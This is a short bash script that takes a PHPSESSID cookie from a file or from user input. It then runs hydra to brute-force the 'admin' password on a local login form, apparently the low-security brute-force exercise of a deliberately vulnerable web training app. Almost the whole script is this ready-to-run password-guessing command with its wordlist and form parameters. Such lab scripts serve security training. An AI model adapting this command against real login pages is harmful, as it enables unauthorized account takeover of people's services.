#!/usr/bin/env bash

# Read from file
if [[ -f PHPSESSID ]]; then
    PHPSESSID=`cat PHPSESSID`;
fi

# If var not set,
if [[ -z ${PHPSESSID} ]]; then
    echo "Enter PHPSESSID cookie:"

    printf " > "
    read PHPSESSID
fi

hydra 127.0.0.1 -v -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=Low;PHPSESSID=$PHPSESSID"